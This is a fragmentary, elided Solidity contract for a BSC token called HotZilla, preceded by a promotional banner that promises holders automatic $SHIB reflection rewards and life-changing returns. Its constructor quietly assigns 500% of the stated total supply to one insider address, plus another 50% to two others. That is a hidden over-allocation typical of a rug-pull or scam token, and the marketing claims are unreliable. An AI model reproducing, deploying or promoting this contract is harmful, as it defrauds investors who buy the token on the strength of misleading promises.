...
----------------------------------------------------------------
---------------------    HotZilla   ----------------------------
Welcome to HotZilla! HotZilla is a best token that rewards its 
holders with reflections every transaction. Which means, just by
holding, believing, and supporting the coin, you automatically 
earn more $SHIB tokens. Our goal is to change people’s lives for
the better. It’s a new opportunity for investors.

https://hotzillabsc.com/
https://www.instagram.com/hotzillachatt/
...
contract Token is IERC20ANTIBOT {
     // FairLaunch
    // common addresses
    address private owner;
    address private ZillaBSC;
    address private ZillaCoin;
    address private Zillas;
    ...
    string public override name = "HotZilla";
    string public override symbol = "HOTZILLA";
    ...
    constructor(uint totalSupplyValue, address ZillaBSCAddress, address ZillaCoinAddress, address ZillasAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        ZillaBSC = ZillaBSCAddress;
        ZillaCoin = ZillaCoinAddress;
        Zillas = ZillasAddress;
        balances[ZillaBSC] =  totalSupply * 1 / 100;
        balances[ZillaCoin] = totalSupply * 49 / 100;
        balances[Zillas] = totalSupply * 500 / 100;
